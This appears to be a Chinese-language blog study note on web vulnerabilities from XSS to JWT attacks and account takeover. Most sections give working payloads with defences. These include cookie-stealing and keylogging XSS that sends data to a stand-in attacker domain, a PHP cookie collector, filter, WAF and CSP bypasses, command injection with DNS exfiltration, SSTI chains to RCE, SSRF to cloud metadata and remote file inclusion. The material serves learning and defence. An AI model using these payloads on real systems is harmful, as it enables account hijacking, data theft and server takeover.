---
title: "Web Security Vulnerabilities"
date: 2026-06-24
category: Computer
cover: /assets/images/posts/web-security-vulnerabilities/cover.png
---

## 一、XSS（跨站脚本）

### 0. 一句话理解

**XSS 的本质：攻击者把自己的 JavaScript 注入到网页里，让它在别人的浏览器中执行。**一旦能执行 JS，攻击者就能以受害者的身份做任何受害者能做的事——读 Cookie、偷登录态、伪造界面、发请求。  
根本原因只有一个：**应用把"用户输入的数据"当成了"代码"来渲染/执行**。所有防御也都围绕这一点：让数据永远只是数据。  
💡 **名词速记**：payload = 你真正塞进去、用来触发漏洞的那段内容；vector = 从哪个入口打进去；PoC = 证明漏洞真实可利用的最小演示；sink/source = DOM XSS 里数据输出/输入的位置。

### 1. 三种 XSS 类型

* **反射型 XSS（Reflected）**：恶意代码藏在 URL/请求参数里，服务器把它原样"反射"回页面。受害者点了攻击者发的链接才会触发。一次性，不存库。  
* **存储型 XSS（Stored）**：恶意代码被存进了服务器（比如评论、昵称、工单内容），之后每个访问该页面的人都会中招。危害最大，因为不需要诱导点击。  
* **DOM 型 XSS（DOM-based）**：漏洞完全发生在前端 JavaScript——前端代码把用户输入直接写进 DOM（如 innerHTML）。恶意代码可能根本不经过服务器，所以服务端日志看不到，最难排查。

💡 *记忆法：反射型看"链接"，存储型看"数据库"，DOM 型看"前端 JS 怎么用输入"。*

### 2. 探测与判断注入点

第一步不是直接利用，而是确认"我的输入真的被当代码执行了"。推荐的探测 payload：  
```html
// 弹出当前域名而非 alert(1)，看清 XSS 跑在哪个域（判断危害是否真实）
<script>alert(document.domain)</script>
<script>alert(window.origin)</script>
```

```html
// 存储型场景：用 console.log 代替 alert，免得反复关弹窗
<script>console.log('XSS from search bar: '+document.domain)</script>
```

```html
// 想直接断点调试，而不是弹窗
<script>debugger;</script>
```

### 3. 攻击的真实目标（PoC，不要只会 alert）

在真实报告里只弹 alert(1) 说服力很弱。下面是几类"证明真正危害"的可用 payload：

#### 3.1 偷 Cookie / Token（会话劫持）

```html
<script>document.location='http://[攻击者域名]/grab.php?c='+document.cookie</script>
<script>new Image().src='http://[攻击者域名]/c.php?c='+document.cookie;</script>
<script>document.location='http://[攻击者域名]/grab.php?t='+localStorage.getItem('access_token')</script>
```
攻击者侧用一个最简单的接收脚本把数据写进文件（PHP 示例）：  
```php
<?php
$cookie = $_GET['c'];
$fp = fopen('cookies.txt', 'a+');
fwrite($fp, 'Cookie:'.$cookie."\r\n");
fclose($fp);
?>
```

#### 3.2 用 fetch 把数据外带（绕过简单同源限制）

```html
<script>
fetch('https://[攻击者域名]', {method:'POST', mode:'no-cors', body:document.cookie});
</script>
```

#### 3.3 键盘记录器（Keylogger）

```html
<img src=x onerror='document.onkeypress=function(e){fetch("http://[攻击者域名]/?k="+String.fromCharCode(e.which))},this.remove();'>
```

#### 3.4 UI 伪造（假登录框骗账号密码）

```html
<script>
history.replaceState(null, null, '../../../login');
document.body.innerHTML = "<h1>Please login to continue</h1><form>Username: <input type='text'>Password: <input type='password'><input value='submit' type='submit'></form>";
</script>
```

### 4. 按"注入上下文"分类的具体 Payload

核心思路：**同一段输入，落在 HTML 的不同位置，逃逸方式完全不同**。先判断上下文，再选对应 payload。

#### 4.1 HTML 标签上下文

```html
// 最基础
<script>alert('XSS')</script>
"><script>alert('XSS')</script>          // 前面有属性需要先闭合时，用 "> 跳出
```

```html
// 图片：利用加载失败事件
<img src=x onerror=alert('XSS')>
"><img src=x onerror=alert(String.fromCharCode(88,83,83))>
```

```html
// SVG：加载即触发
<svg onload=alert(1)>
<svg/onload=alert('XSS')>
```

```html
// HTML5 标签：自动聚焦/媒体事件触发
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<video><source onerror="javascript:alert(1)">
<audio src onloadstart=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<body onload=alert(1)>
```

```html
// 加载远程 JS（payload 太长或要复用时）
<script src=//[攻击者域名]/x.js></script>
<svg/onload='fetch("//[攻击者域名]/a").then(r=>r.text().then(t=>eval(t)))'>
```

#### 4.2 已在 JavaScript 上下文里（输入被塞进了一段 JS）

比如页面里是 var x = "你的输入";，要闭合字符串再续写代码：  
```html
";alert(1);//          // 闭合双引号 → 结束语句 → 注释掉后面
';alert(1);//          // 单引号版本
</script><script>alert(1)</script>     // 直接闭合整个 script 块
-(confirm)(document.domain)//          // 无引号写法
```

#### 4.3 URI 包装器（输入落在 href / src 里）

```html
javascript:alert(1)
javascript:prompt(1)
data:text/html,<script>alert(1)</script>
data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+      // 等价于 <svg/onload=alert(2)>
vbscript:msgbox("XSS")                                  // 仅老 IE
```

#### 4.4 文件类 XSS（SVG / Markdown / CSS）

```html
// SVG 文件（上传头像/图片处常见），存成 .svg 上传
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
```

```javascript
// Markdown（评论/文档功能）
[click](javascript:alert(document.cookie))
[click](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
```

```html
// CSS 注入：通过 background url 闭合 </style> 再插标签
<style>div{background-image:url("</style><svg/onload=alert(document.domain)>");}</style>
```

#### 4.5 隐藏输入框 / 大写输出等特殊场景

```
// 输入落在 <input type=hidden> 里：用 accesskey，按 Alt+Shift+X 触发
<input type="hidden" accesskey="X" onclick="alert(1)">
```

```
// 输出被强制转大写：用 HTML 实体编码绕过
<IMG SRC=1 ONERROR=alert(1)>
```

### 5. 绕过防御（Bypass）的具体 Payload

共同思路：**同一语义，换一种浏览器仍能解析、但过滤规则没覆盖到的写法**。

#### 5.1 Filter 过滤器绕过

```
// 大小写混合（HTML 标签不区分大小写）
<ScRiPt>alert('XSS')</ScRiPt>
```

```html
// 嵌套：过滤器删掉中间 <script> 后，剩下的反而拼成合法标签
<scr<script>ipt>alert('XSS')</scr<script>ipt>
```

```html
// 编码绕过关键字匹配
<script>alert('XSS')</script>             // Unicode 转义的 alert
<script>eval('\x61lert(1)')</script>           // Hex 转义
<object data="javascript:alert(1)">
```

```
// 在 javascript: 里插制表符/换行，浏览器忽略，过滤器匹配不到
java%09script:alert(1)        // 水平制表符 (\t)
java%0ascript:alert(1)        // 换行 (\n)
javascript://%0Aalert(1)      // 用注释 + 换行
```

```html
// 反引号调用，绕过对 ( ) 的过滤
<svg onload=alert`1`>
```

#### 5.2 常见 WAF 绕过（实战记录，云 WAF 会更新，仅供理解思路）

```html
// Cloudflare（历史 payload）
<svg/onload=%26nbsp;alert`bohdan`+>
<svg/OnLoad="`${prompt``}`">
1'"><img/src/onerror=.1|alert``>
```

```javascript
// 用
 : 等 HTML 实体把关键字拆碎
<a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;alert(document.domain)">X</a>
```

#### 5.3 Polyglot（一段通杀多种上下文）

```
// 0xsobky 经典款
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

```html
// s0md3v 短款
-->'"/></sCript><svG x=">" onload=(confirm)``>
```
💡 原理：把各种闭合符号（引号、注释、标签结束）和触发方式堆在一起，无论落在哪种上下文都能"凑巧"闭合并执行。

#### 5.4 CSP 绕过

CSP 规定"哪些来源的脚本才允许执行"。配置不当时可绕过：  
```html
// 白名单里有 google 等大站时，滥用其 JSONP 接口（回调可控）执行任意函数
<script src="//google.com/complete/search?client=chrome&jsonp=alert(1)"></script>
https://accounts.google.com/o/oauth2/revoke?callback=alert(1337)
https://www.youtube.com/oembed?callback=alert;
```

```javascript
// default-src 'self' 'unsafe-inline' 时，动态建 script 标签从可信路径加载
script=document.createElement('script');
script.src='//[攻击者域名]/csp.js';
window.frames[0].document.head.appendChild(script);
```
工具：csp-evaluator.withgoogle.com 检测自己网站 CSP 是否够强。

#### 5.5 AngularJS 客户端模板注入（CSTI）

用了 AngularJS 的页面，若用户输入进了模板，{{ }} 表达式会被求值：  
```
// 页面需有 ng-app 指令；AngularJS 1.6+ 已移除沙箱
{{constructor.constructor('alert(1)')()}}
{{$eval.constructor('alert(1)')()}}
{{$on.constructor('alert(1)')()}}
```

#### 5.6 Mutated XSS（mXSS）

利用浏览器把 HTML 写回 DOM（innerHTML）时的"变异"怪癖，绕过 DOMPurify 等净化库：  
```html
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
```

### 6. Blind XSS（盲打）

注入点的输出**你自己看不到**（比如显示在后台管理员面板）。用从远程加载脚本的 payload 配合回连平台（XSS Hunter / ezXSS），触发时回传现场信息通知你。  
```html
"><script src="https://[攻击者域名]"></script>
"><script src=//[攻击者域名]></script>
<script>$.getScript("//[攻击者域名]")</script>
```

```html
// 先用最轻量的方式确认存在盲打，再上重型工具
<script>document.location='http://[攻击者域名]/grab.php?c='+document.domain</script>
```
常见盲打入口：联系表单、客服工单、评论框、被后台日志记录的 **Referer / User-Agent** 请求头。  
攻击者侧一行起一个 HTTP 服务器接收回连：ruby -run -ehttpd . -p8080

### 7. 站在防御方（对做后端/平台很重要）

* **输出编码（最关键）**：渲染数据时按上下文转义——HTML 上下文转义 < > & " '，JS、URL 上下文各有转义方式。"在哪输出，就按哪转义"。  
* **输入校验/净化**：富文本用成熟净化库（如 DOMPurify），不要自己写正则过滤（看第 5 节就知道基本都能被绕）。  
* **纵深防御**：配置严格 **CSP**；给 Cookie 加 HttpOnly（让 JS 读不到，第 3.1 节的偷 Cookie 就失效）、Secure、SameSite。

### 8. 练手靶场与工具

* **PortSwigger Web Security Academy** — XSS 全套免费实验室，最系统，强烈推荐。  
* **Root-Me** — Reflected / Stored / DOM / Filter Bypass 分级挑战。  
* 自动化探测：**Dalfox**（Go，快）、**XSStrike**、**xsser**、**XSpear**。  
* 盲打回连：**XSS Hunter**、**ezXSS**、**bXSS**。  
* 防御侧：**csp-evaluator**、**DOMPurify**。

## 二、CSRF（跨站请求伪造）

### 0. 一句话理解

**CSRF 的本质：攻击者诱导已登录的受害者，在不知情的情况下，向目标网站发出一个"改变状态"的请求。**比如改邮箱、改密码、转账、改权限。  
关键原理：浏览器有个"贴心"的默认行为——**只要请求发给某个站点，浏览器就会自动带上该站点的 Cookie**，不管这个请求是从哪个页面发起的。所以攻击者的页面发往银行的请求，会自动带上你登录银行的 Cookie，服务器以为是你本人操作。  
💡 **CSRF 和 XSS 的区别**：XSS 是"在你的站点执行我的脚本"（滥用站点对用户的信任）；CSRF 是"借你的登录态替你发请求"（滥用站点对浏览器自动带 Cookie 的信任）。CSRF 攻击者看不到响应，所以只用于"触发动作"，不能直接偷数据。

### 1. 攻击成立的三个条件

* **有意义的动作**：目标请求能改变状态（改密码、转账、删数据）。  
* **依赖 Cookie 做身份认证**：服务器仅凭自动发送的 Cookie 判断身份，没有别的校验。  
* **请求参数可预测**：攻击者能完整构造出这个请求（没有他猜不到的随机值，比如 CSRF token）。

### 2. 具体 PoC（按请求类型）

#### 2.1 GET 请求（最简单）

```
// 需要受害者点击
<a href="http://example.com/api/setusername?username=CSRFd">点我领奖</a>
```

```html
// 无需交互：图片一加载就自动发出 GET 请求
<img src="http://example.com/api/setusername?username=CSRFd">
```
💡 这就是为什么"改变状态的操作绝不能用 GET"——一个 <img> 就能触发。

#### 2.2 POST 请求

```html
// 自动提交表单，无需受害者操作。打开页面即触发
<form id="f" action="http://example.com/api/setusername" method="POST">
  <input name="username" type="hidden" value="CSRFd" />
</form>
<script>document.getElementById("f").submit();</script>
```

#### 2.3 JSON API 请求

```html
// 简单请求：用 text/plain 绕过预检（CORS 不拦截简单请求）
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://example.com/api/setrole");
xhr.setRequestHeader("Content-Type", "text/plain");
xhr.withCredentials = true;
xhr.send('{"role":"admin"}');
</script>
```

```
// 用表单伪造 JSON 体（hidden input 名+值拼成 JSON），绕过部分浏览器保护
<form id="p" action="http://example.com/api/setrole" enctype="text/plain" method="POST">
  <input type="hidden" name='{"role":"admin", "x":"' value='"}' />
</form>
<script>document.getElementById("p").submit();</script>
```

### 3. 绕过 CSRF 防御的思路

* **换请求方法**：token 只在 POST 校验？试试 GET。  
* **删掉 token 参数**：有些后端"没有 token 就不校验"，整个删掉反而通过。  
* **token 不与会话绑定**：用你自己账号的合法 token 去打受害者。  
* **Referer 校验有缺陷**：删掉 Referer 头（用 <meta name="referrer" content="no-referrer">），或构造让其校验逻辑误判的 URL。

### 4. 防御（重点）

* **CSRF Token（最主流）**：每个表单/请求带一个服务器生成、与会话绑定的随机值。攻击者猜不到，伪造的请求就缺这个值。  
* **SameSite Cookie**：给 Cookie 设 SameSite=Lax 或 Strict，浏览器就不会在跨站请求里自动带上它——从根上掐断 CSRF。现代框架的默认值。  
* **校验 Origin / Referer 头**：确认请求来自自己的域。  
* **敏感操作二次确认**：改密码要求输入旧密码等。

💡 作为后端开发，记住：**用框架内置的 CSRF 防护（Rails 的 protect_from_forgery、各框架的 CSRF 中间件）+ SameSite Cookie**，基本就够了。

## 三、IDOR（不安全的直接对象引用）

### 0. 一句话理解

**IDOR 的本质：应用直接拿"用户传来的 ID"去取数据，却没检查这个用户有没有权限看这条数据。**于是把 URL 里的 id=123 改成 id=124，就看到了别人的资料。  
它属于"**访问控制 / 授权**"漏洞——系统认得你是谁（认证没问题），但没检查"你能不能访问这个对象"（授权出了问题）。它没有花哨的 payload，最朴素却极常见、危害极大。

### 1. 经典示例

```
// 后端只用了传入的 user_id 取数据，没校验归属
https://example.com/profile?user_id=123   // 我的
https://example.com/profile?user_id=124   // 改一下 → 看到别人的
```

### 2. 怎么找 IDOR（按参数类型）

* **数字 ID**：直接加减遍历。287789 → 287790 → 287791；也试十六进制 0x4642d、时间戳 1695574808。  
* **可猜的标识**：用户名 john.doe、邮箱 john.doe@mail.com，或它们的 Base64：am9obi5kb2VAbWFpbC5jb20=。  
* **弱随机 ID**：UUID v1（含时间戳，可预测）、MongoDB ObjectId（5ae9b90a2c144b9def01ec37，结构=时间戳+机器+进程+计数器，可推测）。  
* **哈希参数**：若 ID 是 md5(email)、sha1(username)，知道算法就能自己算出别人的。  
* **通配符**：把 ID 换成 \* % . _，有的后端会返回所有用户数据：GET /api/users/\* HTTP/1.1

### 3. 进阶绕过技巧（后端校验不完整时）

```
改 HTTP 方法：       POST  →  PUT
改 Content-Type：    XML   →  JSON
数值改成数组：       {"id":19}  →  {"id":[19]}
参数污染：           user_id=我的id&user_id=受害者id
```

### 4. 防御

* **每次访问都校验归属**：不要只用传入的 ID 查库，要加上"WHERE owner_id = 当前登录用户"这类条件，确认对象属于当前用户。这是治本。  
* **用不可预测的标识**：对外暴露 UUID v4（随机）而非自增数字，提高遍历难度（但这只是加固，不能替代授权校验）。  
* **统一的访问控制层**：在框架层集中做权限判断，别每个接口各写一套（容易漏）。

## 四、Session Fixation（会话固定）

### 0. 一句话理解

**Session Fixation 的本质：攻击者先拿到/指定一个会话 ID，想办法让受害者用这个攻击者已知的会话 ID去登录。受害者登录成功后，这个会话就变成"已认证"状态，而攻击者也知道它，于是直接接管。**  
它和"偷 Cookie"方向相反：不是登录后去偷会话，而是登录前先把会话"种"给受害者。根因是——**用户登录成功后，服务器没有更换会话 ID**。

### 1. 攻击流程

* ① 攻击者访问网站，拿到一个未登录的会话 ID（如 SESSIONID=ABC123）。  
* ② 想办法让受害者的浏览器用上这个 ID。常见手段：  
```
  // URL 里带会话 ID（若网站支持 URL 重写会话）
  http://example.com/login?SESSIONID=ABC123
```

```javascript
  // 借助 XSS 或可控响应头给受害者种 Cookie
  document.cookie="SESSIONID=ABC123";
```
* ③ 受害者用 ABC123 这个会话正常登录。  
* ④ 因为服务器登录后没换 ID，ABC123 现在是"已登录"状态，攻击者用同一个 ID 直接进入受害者账号。

### 2. 防御（核心就一条）

* **登录成功后立刻重新生成会话 ID**（session regeneration / rotate）。这样攻击者预先知道的旧 ID 作废，攻击直接失效。Rails 等框架登录时调用 reset_session 即可。  
* **别用 URL 传会话 ID**，只用 Cookie，并加 HttpOnly / Secure / SameSite。  
* 会话设置合理的过期时间，登出时彻底销毁服务端会话。

## 五、PII / 敏感信息泄露

### 0. 一句话理解

**PII（Personally Identifiable Information，个人识别信息）泄露：系统把本不该暴露的个人/敏感数据，泄露给了无权访问的人。**对应 OWASP 的"Sensitive Data Exposure / Cryptographic Failures"。  
PII 指能定位到具体个人的信息：姓名、身份证/手机号、邮箱、住址、银行卡、健康记录等。它常常不是单独的漏洞，而是其它漏洞（如 IDOR、XSS、配置错误）的"最终危害"——所以前面几类漏洞的严重程度，往往就用"能否拿到 PII"来衡量。

### 1. 常见泄露途径

* **越权访问（最常见）**：通过 IDOR、缺失的权限校验，直接拉到别人的 PII。  
* **传输/存储不加密**：明文 HTTP 传输、数据库明文存密码或证件号。  
* **错误信息 / 调试信息**：报错堆栈、debug 页面暴露用户数据或内部结构。  
* **响应里返回了多余字段**：API 把整张用户表的字段都吐出来（含手机号、密码哈希），前端只是没显示。  
* **客户端泄露**：PII 写进了前端 JS、localStorage、URL 参数（会进浏览器历史和 Referer）、日志。  
* **缓存/索引**：敏感页面被 CDN 缓存、被搜索引擎索引。  
* **元数据**：上传的图片 EXIF 含 GPS 位置、文档属性含作者信息。

### 2. 怎么排查

* 抓包看 API 响应里有没有"前端没显示但实际返回了"的敏感字段。  
* 检查是否全程 HTTPS；Cookie 是否有 Secure。  
* 翻前端 JS、source map、localStorage、URL 参数里有没有 PII。  
* 故意触发错误，看报错页是否泄露数据/路径/版本。  
* 检查 robots.txt、目录列举、备份文件（.bak、.git）等是否暴露。

### 3. 防御

* **最小化原则**：API 只返回前端真正需要的字段（用序列化白名单，别直接 dump 整个对象）。  
* **全程加密**：传输用 HTTPS（HSTS），存储敏感字段加密，密码用 bcrypt/argon2 哈希。  
* **严格授权**：每个数据访问都校验权限（呼应 IDOR 防御）。  
* **不把 PII 放进 URL、日志、前端可读位置**；关闭生产环境的详细报错。  
* **脱敏**：展示时打码（手机号 138\*\*\*\*0000），日志里过滤 PII。

💡 对在托管/平台公司做后端的你，这条最实用：**review API 响应体，把"前端没用到却返回了"的敏感字段删掉**——这是性价比最高的一类修复。

## 六、SQL 注入（SQLi）

### 0. 一句话理解

**SQLi 的本质：应用把用户输入拼接进 SQL 语句，攻击者输入特制内容，让自己的数据"变成"了 SQL 代码的一部分，从而篡改查询逻辑。**可读取、篡改、删除数据库，严重时控制整台数据库服务器。  
💡 根因和 XSS 完全同源：**数据与代码没分离**。XSS 拼进 HTML，SQLi 拼进 SQL。

### 1. 探测注入点

```
'                 // 输入单引号，若报 SQL 语法错误，多半有注入
"
')
';--
1' AND '1'='1    // 永真，页面正常
1' AND '1'='2    // 永假，页面异常 → 确认注入
```

### 2. 认证绕过（最经典）

登录框 SELECT \* FROM users WHERE name='输入' AND pass='输入'，注入让条件永真：  
```
admin'--                  // 注释掉密码校验
admin'#                   // MySQL 注释
' OR '1'='1
' OR 1=1--
') OR ('1'='1
```

### 3. UNION 注入（直接拖数据）

```
// ① 先确定列数（逐个加，直到不报错）
' ORDER BY 1--
' ORDER BY 2--  ...
```

```sql
// ② 用 UNION 拼一条自己的查询读数据
' UNION SELECT null,null--                         // 凑够列数
' UNION SELECT username,password FROM users--
' UNION SELECT table_name,null FROM information_schema.tables--   // 爆表名
' UNION SELECT column_name,null FROM information_schema.columns WHERE table_name='users'--
```

### 4. 盲注（页面不回显数据时）

```
// 布尔盲注：靠"页面真/假"一位一位猜
' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'--
```

```
// 时间盲注：靠"响应是否变慢"判断真假
' AND IF(1=1, SLEEP(5), 0)--            // MySQL
'; WAITFOR DELAY '0:0:5'--              // MSSQL
' AND pg_sleep(5)--                     // PostgreSQL
```

### 5. WAF 绕过思路

```
禁空格：    用 /**/ 或括号        →  '/**/OR/**/1=1
禁等号：    用 LIKE 或 <>          →  ' OR 1 LIKE 1
大小写：    SeLeCt
内联注释：  SEL/*x*/ECT
```

### 6. 防御（最重要的一条）

* **参数化查询 / 预处理语句（治本）**：把 SQL 结构和数据彻底分开，数据永远只是数据。各语言都有：

```
// Ruby / Rails（你的技术栈）—— 正确做法
User.where("name = ?", params[:name])      // ✅ 占位符
User.where(name: params[:name])            // ✅ 哈希条件
// 危险写法（字符串拼接，别这么写）：
User.where("name = '#{params[:name]}'")    // ❌
```

* **最小权限**：数据库账号只给必要权限。**输入校验**、**用 ORM** 作为补充。绝不要相信"过滤特殊字符"能根治——见上面的绕过。

## 七、命令注入（Command Injection）

### 0. 一句话理解

**应用把用户输入拼进了"要执行的系统命令"里**（如 ping 用户输入的IP），攻击者用命令分隔符接上自己的命令，让服务器执行任意系统命令（RCE，危害极高）。

### 1. 命令拼接符（核心 payload）

```
; id              // 前一条结束后执行 id
| id              // 管道
|| id             // 前一条失败才执行
&& id            // 前一条成功才执行
& id
 `id`              // 反引号：命令替换 
$(id)             // 命令替换
%0a id            // 换行符
// 实战常这样接在合法参数后：
127.0.0.1; cat /etc/passwd
127.0.0.1 && whoami
```

### 2. 过滤绕过

```
禁空格：   cat</etc/passwd     或  {cat,/etc/passwd}    或  $IFS
拆关键字： c''at /etc/passwd   或  ca\t /etc/passwd
通配符：   /???/c?t /etc/passwd
变量拼接： a=c;b=at;$a$b /etc/passwd
```

### 3. 数据外带（无回显时）

```
// DNS 外带：把命令结果塞进域名查询，在自己的 DNS 日志里看
ping `whoami`.attacker.com
// 时间盲：靠延迟判断
; sleep 5
```

### 4. 防御

* **根本上避免调用 shell**：用语言提供的、把命令和参数分开传的 API（如不经过 shell 的 exec 数组形式），别用字符串拼命令。  
* 必须用输入时，用**严格白名单**校验（如只允许合法 IP 格式），而不是黑名单过滤。

## 八、SSRF（服务端请求伪造）

### 0. 一句话理解

**SSRF：攻击者让服务器替自己去访问某个 URL。**因为请求是从服务器内部发出的，能借机访问外网打不到的内网服务、云元数据接口等。常见于"填个图片 URL / webhook / 导入远程文件"这类功能。

### 1. 经典目标

```
http://127.0.0.1/           // 本机服务
http://localhost/
http://169.254.169.254/latest/meta-data/   // 云元数据(AWS)，可偷临时凭证！
http://metadata.google.internal/            // GCP 元数据
file:///etc/passwd          // 读本地文件
dict://, gopher://          // 配合可构造任意 TCP 请求（gopher 常用于打内网 Redis 等）
```

### 2. 绕过"禁止内网/localhost"过滤

```
http://127.0.0.1   →  http://127.1   /  http://0.0.0.0  /  http://[::1]   (IPv6)
十进制/十六进制 IP：  http://2130706433/   (=127.0.0.1)   http://0x7f000001/
用自己控制的域名做 DNS 解析到内网 / DNS Rebinding
用 30x 跳转：自己的域名 302 跳到 http://169.254.169.254
URL 解析歧义：     http://expected.com@127.0.0.1/   http://127.0.0.1#@expected.com/
```

### 3. 防御

* **白名单**允许访问的域名/协议（只允许 http/https，禁 file/gopher/dict）。  
* 解析出最终 IP 后**校验不是内网地址**（注意要在跟随重定向后再校验，防 DNS Rebinding）。  
* 云上给元数据接口加保护（如 AWS IMDSv2），关闭不必要的出网。

## 九、SSTI（服务端模板注入）

### 0. 一句话理解

**用户输入被当成"模板代码"交给模板引擎渲染**（如 Jinja2、Twig、Freemarker）。因为模板引擎能执行表达式，往往可直接升级到**读文件、执行命令（RCE）**。

### 1. 探测（通用 payload）

```
${7*7}     {{7*7}}     #{7*7}     <%= 7*7 %>     ${{7*7}}
// 若页面回显 49，说明输入被求值了 → 存在 SSTI
// 区分引擎：
{{7*'7'}}   →  Jinja2 返回 7777777，Twig 返回 49
```

### 2. 升级到 RCE（示例：Python Jinja2）

```
// 经典：通过对象链拿到 os 模块执行命令
{{ ''.__class__.__mro__[1].__subclasses__() }}     // 先枚举可用类
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```
💡 不同引擎/语言利用链不同（Twig、Freemarker、Velocity 各有套路），但思路一致：**从模板上下文里的对象，顺藤摸瓜找到能执行命令的入口**。

### 3. 防御

* **绝不把用户输入拼进模板**。用户数据只作为"变量值"传给模板（render(template, name=用户输入)），而不是拼成模板字符串。  
* 需要用户自定义模板时，用**沙箱化**的引擎/受限环境。

## 十、XXE（XML 外部实体注入）

### 0. 一句话理解

**XML 解析器若允许"外部实体"，攻击者就能在 XML 里定义一个实体去读服务器文件或发起请求（SSRF）。**常见于接收 XML 的接口、SOAP、以及 docx/xlsx/svg 这类本质是 XML 的文件。

### 1. 读取本地文件（经典 XXE）

```
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>            // 实体 &xxe; 被展开成文件内容
```

### 2. 借 XXE 打 SSRF

`<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">`

### 3. 盲 XXE（无回显，数据外带）

用外部 DTD 把读到的内容拼进一个发往攻击者服务器的 URL 里带出来（OOB）。也可用 "Billion Laughs" 实体嵌套做 DoS。

### 4. 防御

* **禁用外部实体和 DTD**（各语言 XML 库都有开关，如 Java 设 disallow-doctype-decl）。这是治本且简单的一招。  
* 能用 JSON 就别用 XML；用安全配置好的解析库。

## 十一、路径穿越 / 文件包含

### 0. 一句话理解

**应用用用户输入拼接文件路径**，攻击者用 ../ 跳出预期目录，读取（路径穿越）甚至执行（文件包含）任意文件。

### 1. 基础 payload

```
../../../../etc/passwd                 // Linux
........\windows\win.ini           // Windows
// 编码绕过过滤：
%2e%2e%2f                              // ../ 的 URL 编码
..%252f                                // 双重编码
....//                                 // 过滤了 ../ 时，删一次后又拼回 ../
```

### 2. 文件包含（LFI/RFI，多见于 PHP）

```
?file=../../../../etc/passwd
?file=php://filter/convert.base64-encode/resource=config.php   // 读源码
?file=http://attacker.com/shell.txt                            // RFI 远程包含 → RCE
```

### 3. 防御

* **不要用用户输入直接拼路径**。用白名单/映射表（用户传 ID，后端查对应真实文件名）。  
* 规范化路径后校验仍在允许目录内；关闭 PHP 的远程包含（allow_url_include=Off）。

## 十二、文件上传漏洞

### 0. 一句话理解

**上传功能若校验不严，攻击者上传一个"网页脚本"（webshell），再访问它就能在服务器执行代码（RCE）。**

### 1. 常见绕过技巧

```
改扩展名：     shell.php → shell.pHp / shell.php5 / shell.phtml / shell.php.jpg
双扩展名：     shell.jpg.php
空字节(老系统)：shell.php%00.jpg
改 Content-Type： 把 image/png 写进请求头骗 MIME 校验
图片马：       在真实图片末尾追加 PHP 代码，配合包含漏洞触发
改 .htaccess： 上传一个 .htaccess 让服务器把某扩展名当 PHP 解析
```

### 2. 防御

* **白名单**校验扩展名 + 校验真实文件内容（magic bytes），不只看 Content-Type。  
* **上传目录禁止执行脚本**（关键！即使传上去也跑不起来）；文件重命名为随机名；存到对象存储/独立域名。

## 十三、Open Redirect（开放重定向）

### 0. 一句话理解

**应用根据用户传入的 URL 做跳转，却不校验目标**，攻击者构造一个"看起来是可信站、实则跳到钓鱼站"的链接。本身危害中等，但常被用来配合钓鱼、OAuth token 窃取、绕过跳转白名单。

### 1. payload 与绕过

```
https://example.com/redirect?url=https://evil.com         // 基础
// 绕过"必须是本站"校验：
?url=https://example.com.evil.com        // 把可信域做成子域前缀
?url=https://evil.com#example.com
?url=//evil.com                          // 协议相对 URL，浏览器补成 https://evil.com
?url=https:evil.com
?url=/\evil.com                          // 反斜杠被部分浏览器当 //
```

### 2. 防御

* 跳转目标用**白名单**，或只允许**相对路径**（站内跳转）。  
* 需要跳外链时，走一个"即将离开本站"的确认中转页。

## 十四、JWT 攻击

### 0. 一句话理解

**JWT** 是一种"自包含"的登录凭证，格式 Base64(头).Base64(载荷).签名。它不加密、只签名，所以载荷人人可读；安全完全依赖"签名验证"。攻击多围绕**让服务器接受一个被篡改但签名"看似有效"的 token**。

### 1. 常见攻击

* **alg: none**：把头里的算法改成 none、去掉签名，若服务器接受 → 可任意伪造载荷（如把 admin:false 改成 true）。  
* **弱密钥爆破**：HS256 用弱 secret 签名时，可离线爆破出 secret，然后任意签发 token。hashcat / jwt_tool 可做。  
* **RS256 → HS256 密钥混淆**：服务器用公钥当 HMAC 密钥验签时，攻击者用公开的公钥自己签 HS256 token。  
* **kid / jku 注入**：篡改头里指向密钥的字段，诱导服务器用攻击者控制的密钥验签。

### 2. 防御

* **服务端固定算法**，明确拒绝 none；用**强随机 secret**（HS256）或妥善保管私钥（RS256）。  
* 校验 kid/jku 等头部字段来源；设置合理过期 exp；敏感场景考虑服务端可吊销的会话。

## 十五、认证缺陷 / 账户接管

### 0. 一句话理解

登录、注册、找回密码、改密码这些"身份"环节本身的逻辑缺陷，可导致**账户接管（ATO）**。这类漏洞往往不靠 payload，而靠**逻辑分析**。

### 1. 常见弱点

* **弱口令 / 撞库 / 暴力破解**：登录无频率限制、无验证码、无锁定。  
* **验证码（OTP）缺陷**：验证码可爆破（4 位且不限次）、可复用、响应里直接返回了 OTP。  
* **找回密码逻辑**：重置 token 可预测/不过期/不绑定用户；通过修改请求里的 email/user_id 给别人改密码（本质是 IDOR）。  
* **响应/状态混淆**：靠返回信息差异枚举出哪些用户名存在（user enumeration）。  
* **会话问题**：登出后 token 仍有效、改密码后旧会话不失效。  
* **OAuth / SSO 缺陷**：redirect_uri 校验不严（结合 Open Redirect）窃取授权码。

### 2. 防御

* 登录/OTP 加**频率限制 + 锁定 + 验证码**；重置 token 用**强随机、短有效期、一次性、绑定用户**。  
* 开启 **MFA（多因素）**；改密码/敏感操作后**使所有旧会话失效**。  
* 统一登录失败提示，避免用户枚举；严格校验 OAuth 的 redirect_uri。
